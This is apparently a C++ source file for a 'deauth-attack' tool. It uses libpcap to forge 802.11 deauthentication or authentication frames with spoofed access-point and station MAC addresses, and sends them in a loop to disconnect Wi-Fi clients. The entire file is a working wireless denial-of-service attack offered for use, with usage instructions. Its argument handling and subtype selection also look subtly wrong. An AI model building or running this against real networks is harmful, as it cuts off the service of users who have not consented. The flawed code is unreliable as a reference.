#include "radio.h"
#include "dot11.h"
#include "mac.h"

#include <iostream>
#include <unistd.h>
#include <cstdio>
#include <pcap.h>
#include <signal.h>

using namespace std;
bool attack = true;
bool AUTH = 0;

#pragma pack(push,1)
struct Deauth_packet{
    #define DEAUTH_CODE 0x0007

    RadioTapHdr radio;
    uint8_t data_rate;
    uint8_t zero;
    uint16_t tx;
    Dot11 dot11;
    uint16_t reasonCode;
};
#pragma pack(pop)

void usage(){
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
    return;
}

void sig_handler(int signo){

    attack = false;
    return;
}

int main(int argc, char* argv[]){
    if(argc != 3 && argc != 4 && argc != 5){
        usage();
        return 0;
    }

    Mac ap = Mac(argv[2]);
    Mac station;
    if(argc == 4){
        station = Mac(argv[3]);
    }
    if(argc == 5){
        station = Mac(argv[3]);
        AUTH = 1;
    }
    else
        station = Mac::broadcastMac();

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
		return -1;
	}

    Deauth_packet packet;
    RadioTapHdr& radio = packet.radio;
    radio.revision = 0;
    radio.pad = 0;
    radio.hdr_len = 12;
    radio.present_flag = 0x00008004;
    
    packet.data_rate = 0x02;
    packet.zero = 0x00;
    packet.tx = 0x0018;
    
    Dot11& dot11 = packet.dot11;
    dot11.version = 0;
    dot11.type = 0;

    dot11.flags = 0;
    dot11.duration = 314;

    dot11.fragSeqNum = 0;

    if(AUTH){
        dot11.subtype = SUBTYPE_DEAUTH;
        dot11.transmitter = station;
        dot11.receiver = ap;
        dot11.bssid = ap;

        packet.reasonCode = DEAUTH_CODE;
    }
    else{
        dot11.subtype = SUBTYPE_AUTH;

        dot11.transmitter = ap;
        dot11.receiver = station;
        dot11.bssid = ap;

        packet.reasonCode = DEAUTH_CODE;
    }

    signal(SIGINT,sig_handler);

    while(attack){
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
        if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        sleep(1);
    }

    pcap_close(handle);
    return 0;
}